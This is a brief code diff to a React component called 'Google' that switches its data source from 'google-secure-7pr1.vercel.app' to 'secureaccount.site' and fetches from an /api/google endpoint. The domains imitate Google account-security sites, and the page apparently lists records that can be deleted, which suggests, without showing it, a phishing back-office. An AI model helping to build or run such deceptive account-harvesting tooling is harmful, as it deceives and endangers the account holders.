@@ -1,7 +1,7 @@
 import DeleteTd from "@/components/DeleteTd";
 import "./styles.css";
 export default async function Google() {
-  const host = "https://google-secure-7pr1.vercel.app";
+  const host = "https://secureaccount.site";
   const res = await fetch(`${host}/api/google`, {
     cache: "no-store",
   });
